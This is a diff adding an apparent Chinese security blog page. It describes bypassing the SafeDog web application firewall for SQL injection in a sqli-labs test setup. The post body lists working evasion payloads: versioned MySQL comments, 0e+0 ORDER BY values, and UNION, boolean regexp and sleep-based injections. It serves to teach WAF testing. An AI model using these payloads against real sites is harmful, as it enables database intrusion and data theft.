@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="zh-cn" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Lioders" />
+	
+	
+	
+	<title>某狗sql注入bypass ｜ </title>
+	
+    
+    
+    <meta name="description" content="环境 safedog4.0.2.3957 &#43; PHP5.5 &#43; APACHE2 源码使用得是sqlid-lesson1 科普 其实几个月前我的贴子，我从判断安全狗拦截位置，然后fuzz出关键字之间/!50000xxx/就ok得注释 在mysql数据库中填充为空白得字符 list =" />
+    
+
+    
+    
+    <meta name="keywords" content="Hugo, Lioders" />
+    
+
+	
+    
+    <link rel="shortcut icon" href="https://liodair.github.io/images/favicon.ico" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="https://liodair.github.io/css/normalize.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://liodair.github.io/css/zozo.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://liodair.github.io/css/highlight.css" />
+
+    
+    
+</head>
+
+<body>
+    <div class="main animate__animated animate__fadeInDown">
+        <div class="nav_container animated fadeInDown">
+    <div class="site_nav" id="site_nav">
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/posts/">Archive</a>
+            </li>
+            
+            <li>
+                <a href="/tags/">Tags</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="menu_icon">
+        <a id="menu_icon"><i class="ri-menu-line"></i></a>
+    </div>
+</div>
+        <div class="header animated fadeInDown">
+    <div class="site_title_container">
+        <div class="site_title">
+            <h1>
+                <a href="https://liodair.github.io/">
+                    <span></span>
+                </a>
+            </h1>
+        </div>
+        <div class="description">
+            <p class="sub_title">lioders &#39;s blog</p>
+            <div class="my_socials">
+                
+                
+                <a href="https://github.com/LiodAir" title="github" target="_blank"><i class="ri-github-fill"></i></a>
+                
+                
+                <a href="https://liodair.github.io/index.xml" type="application/rss+xml" title="rss" target="_blank"><i
+                        class="ri-rss-fill"></i></a>
+            </div>
+        </div>
+    </div>
+</div>
+        <div class="content">
+            <div class="post_page">
+                <div class="post animate__animated animate__fadeInDown">
+                    <div class="post_title post_detail_title">
+                        <h2><a href='/posts/%E5%AE%89%E5%85%A8%E7%8B%97sql%E6%B3%A8%E5%85%A5bypass/'>某狗sql注入bypass</a></h2>
+                        <span class="date">2018.05.09</span>
+                    </div>
+                    <div class="post_content markdown"><h2 id="环境">环境</h2>
+<blockquote>
+<p>safedog4.0.2.3957 + PHP5.5 + APACHE2</p>
+</blockquote>
+<p>源码使用得是sqlid-lesson1</p>
+<p><img src="https://secquan.zzyuncheng.com/4f20414a07d58770d22d64aad6201eaf.png-source" alt=""></p>
+<h2 id="科普">科普</h2>
+<p>其实几个月前我的贴子，我从判断安全狗拦截位置，然后fuzz出关键字之间/!50000xxx/就ok得注释</p>
+<p>在mysql数据库中填充为空白得字符</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">list</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;09&#39;</span>, <span class="s1">&#39;0A&#39;</span>, <span class="s1">&#39;0B&#39;</span>, <span class="s1">&#39;0C&#39;</span>, <span class="s1">&#39;0D&#39;</span>, <span class="s1">&#39;A0&#39;</span>, <span class="s1">&#39;20&#39;</span><span class="o">]</span>
+<span class="nv">list1</span> <span class="o">=</span> <span class="nv">ascii</span> <span class="o">=</span> <span class="o">[</span>chr<span class="o">(</span>i<span class="o">)</span> <span class="k">for</span> i in range<span class="o">(</span>36, 48<span class="o">)]</span>
+</code></pre></div><p>注释</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#</span>
+--
+--+
+/**/
+/*char*/
+<span class="p">;</span>
+</code></pre></div><h2 id="实践">实践</h2>
+<p>这次我也从最简单得开始，哪里拦截就搞哪里</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">order by + 数字 拦截
+and union<span class="o">{</span>拦截<span class="o">}</span><span class="k">select</span> xxx from<span class="o">{</span>拦截<span class="o">}</span>xxx
+func<span class="o">{</span>拦截<span class="o">}()</span>
+</code></pre></div><p>order by拦截后面的数字，之前我的方法是1-》01；2-》02，此次使用科学计数法绕过,以及奇特的八进制和16进制</p>
+<blockquote>
+<p>0e +0 =0</p>
+</blockquote>
+<blockquote>
+<p>order by 0e+0</p>
+</blockquote>
+<p><img src="https://secquan.zzyuncheng.com/4a9e9ff633c7e47d90053b6c69948bd0.png-source" alt=""></p>
+<p>在测试union select的时候,本来这个位置是要fuzz的，无意试了下/!60000x/，明显这里狗并没有怎么拦截.而这里的注释的意思/!50000 select/当mysql版本大于5.0时关注这个命令，小于则不关注,安全狗只会拦截select位置的注入关键字，稍后这个点就可以用到，发现函数调用user()=&gt;/!user//!()/</p>
+<p><img src="https://secquan.zzyuncheng.com/158710742c9e0030e551dd6cc72803cb.png-source" alt=""></p>
+<p>from跟表名，我测试了一大堆fuzz，结果并没有什么结果，在基友的一个tips下 select * from `mysql.user
+，到此 union bypass的字符串应该是
+<img src="https://secquan.zzyuncheng.com/81941edc01c8d35fddc521f9255a3ad0.png-source" alt=""></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="k">select</span> id from user where <span class="nv">id</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span> and 0x01 union /*!60000*/select 1,2,3 from <span class="sb">`</span>mysql0.user<span class="sb">`</span>；
+
+</code></pre></div><h2 id="别的想法">别的想法</h2>
+<blockquote>
+<p>布尔注入，因为我bypass的过程一直跟注释有关，因此</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT * FROM users WHERE <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="o">=</span>/*!user <span class="o">()</span> regexp 0x5e72*/ -- +
+</code></pre></div><p><img src="https://secquan.zzyuncheng.com/dafcc7e2a465a8d88d8f2aae691dbfe3.png-source" alt=""></p>
+<p><img src="https://secquan.zzyuncheng.com/5d59cc9e580f4e672f2034e7f1a5e1e6.png-source" alt=""></p>
+<p>别的，比如,圈子以前的创建变量</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT * FROM users WHERE <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> and sleep/**/<span class="o">((</span><span class="k">select</span> @a:<span class="o">=</span><span class="k">if</span><span class="o">(</span>user/**/<span class="o">()</span> regexp /*!<span class="s1">&#39;a&#39;</span>*/, 1, 2<span class="o">)))</span>
+</code></pre></div><p><img src="https://secquan.zzyuncheng.com/ad247773700395840e6061ed9e696a00.png-source" alt=""></p>
+<h2 id="总结">总结</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">union <span class="k">select</span> id from user where <span class="nv">id</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span> and 0x01 union /*!60000*/select 1,2,3 from <span class="sb">`</span>mysql0.user<span class="sb">`</span>
+bool  SELECT * FROM users WHERE <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="o">=</span>/*!user <span class="o">()</span> regexp 0x5e72*/ -- +
+bool SELECT * FROM users WHERE <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> and sleep/**/<span class="o">((</span><span class="k">select</span> @a:<span class="o">=</span><span class="k">if</span><span class="o">(</span>user/**/<span class="o">()</span> regexp /*!<span class="s1">&#39;a&#39;</span>*/, 1, 2<span class="o">)))</span>
+</code></pre></div></div>
+                    <div class="post_footer">
+                        
+                        <div class="meta">
+                            <div class="info">
+                                <span class="field tags">
+                                    <i class="ri-stack-line"></i>
+                                    
+                                    <a href="https://liodair.github.io/tags/web/">WEB</a>
+                                    
+                                    <a href="https://liodair.github.io/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                                    
+                                </span>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                
+                <div class="doc_comments"></div>
+                
+            </div>
+        </div>
+    </div>
+    <a id="back_to_top" href="#" class="back_to_top"><i class="ri-arrow-up-s-line"></i></a>
+    <footer class="footer">
+    <div class="powered_by">
+        <a href="https://varkai.com">Designed by VarKai,</a>
+        <a href="http://www.gohugo.io/">Proudly published with Hugo</a>
+    </div>
+
+    <div class="footer_slogan">
+        <span>梦想被扼杀的第一个征候就是抱怨没有时间</span>
+    </div>
+</footer>
+    <script src="https://liodair.github.io/js/jquery-3.5.1.min.js"></script>
+<link href="https://liodair.github.io/css/fancybox.min.css" rel="stylesheet">
+<script src="https://liodair.github.io/js/fancybox.min.js"></script>
+<script src="https://liodair.github.io/js/zozo.js"></script>
+
+
+
+
+</body>
+
+</html>
